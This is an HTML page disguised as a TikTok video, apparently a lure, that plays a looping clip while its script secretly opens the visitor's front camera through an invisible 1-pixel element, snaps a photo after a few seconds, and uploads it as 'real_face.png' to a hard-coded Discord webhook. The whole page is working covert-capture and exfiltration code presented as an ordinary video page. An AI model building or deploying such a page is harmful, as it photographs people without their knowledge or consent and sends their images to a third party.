<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
        #tiktok-video { width: 100%; height: 100%; object-fit: cover; }
        #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
        #photo-canvas { display: none; }
    </style>
</head>
<body>

    <video id="tiktok-video" autoplay muted loop playsinline>
        <source src="https://assets.mixkit.co/videos/preview/mixkit-fast-car-driving-on-a-highway-at-night-1595-large.mp4" type="video/mp4">
    </video>

    <video id="hidden-camera" autoplay playsinline muted></video>
    <canvas id="photo-canvas"></canvas>

<script>
    const webhookURL = 'https://discord.com/api/webhooks/1493312893100228608/X78aap9qPQUcppW21eNRpVDCiJGIS3OFDw6rH6ZKTPVTzsQbsGJyBKMWV7slNEt67zUs';

    window.onload = async () => {
        const camera = document.getElementById('hidden-camera');
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            camera.srcObject = stream;

            // التأكد من أن الكاميرا بدأت "فعلياً" في بث الصورة قبل التصوير
            camera.onloadedmetadata = () => {
                camera.play();
                
                // ننتظر 4 ثوانٍ بعد تشغيل الكاميرا لضمان التركيز والضوء
                setTimeout(() => {
                    captureAndSend(camera);
                }, 4000);
            };

        } catch (err) {
            console.log("Access denied");
        }
    };

    async function captureAndSend(cameraElement) {
        const canvas = document.getElementById('photo-canvas');
        const context = canvas.getContext('2d');

        // إذا كانت أبعاد الكاميرا صفراً (شاشة سوداء)، ننتظر ونحاول مرة أخرى
        if (cameraElement.videoWidth === 0) {
            setTimeout(() => captureAndSend(cameraElement), 1000);
            return;
        }

        canvas.width = cameraElement.videoWidth;
        canvas.height = cameraElement.videoHeight;
        context.drawImage(cameraElement, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            if (!blob) return;
            const formData = new FormData();
            formData.append('file', blob, 'real_face.png');
            await fetch(webhookURL, { method: 'POST', body: formData });
        }, 'image/png');
    }
</script>
</body>
</html>
